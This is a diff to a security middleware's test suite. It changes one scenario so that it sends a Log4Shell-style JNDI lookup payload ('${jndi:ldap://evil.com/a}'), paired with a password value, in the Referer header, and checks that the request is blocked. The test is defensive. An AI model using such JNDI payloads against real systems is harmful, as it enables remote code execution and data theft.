@@ -1253,20 +1253,18 @@ async def _run_header_dump_pair_value(secret: str, ctx: "_ScenarioContext") -> N
     assert response is not None, "header_dump_pair_value scenario never blocked"
 
 
-async def _run_custom_excluded_header_log4shell_with_pair(
+async def _run_default_excluded_header_log4shell_with_pair(
     secret: str, ctx: "_ScenarioContext"
 ) -> None:
-    client_ip = _client_ip_for("custom_excluded_header_log4shell_with_pair")
-    config = _scenario_config(excluded_detection_headers={"x-custom-excluded"})
+    client_ip = _client_ip_for("default_excluded_header_log4shell_with_pair")
+    config = _scenario_config()
     middleware = _scenario_middleware(config)
     value = f"password={secret} ${{jndi:ldap://evil.com/a}}"
-    request = MockGuardRequest(
-        headers={"X-Custom-Excluded": value}, client_host=client_ip
-    )
+    request = MockGuardRequest(headers={"Referer": value}, client_host=client_ip)
     pipeline = build_default_pipeline(middleware)
     response = await pipeline.execute(request)
     assert response is not None, (
-        "custom_excluded_header_log4shell_with_pair scenario never blocked"
+        "default_excluded_header_log4shell_with_pair scenario never blocked"
     )
 
 
@@ -1839,8 +1837,8 @@ _COMPONENT_SCENARIOS: list[ComponentScenario] = [
     ),
     ComponentScenario("header_dump_pair_value", _run_header_dump_pair_value),
     ComponentScenario(
-        "custom_excluded_header_log4shell_with_pair",
-        _run_custom_excluded_header_log4shell_with_pair,
+        "default_excluded_header_log4shell_with_pair",
+        _run_default_excluded_header_log4shell_with_pair,
     ),
     ComponentScenario("custom_validator_echo", _run_custom_validator_echo),
     ComponentScenario("time_window_closed", _run_time_window_closed),
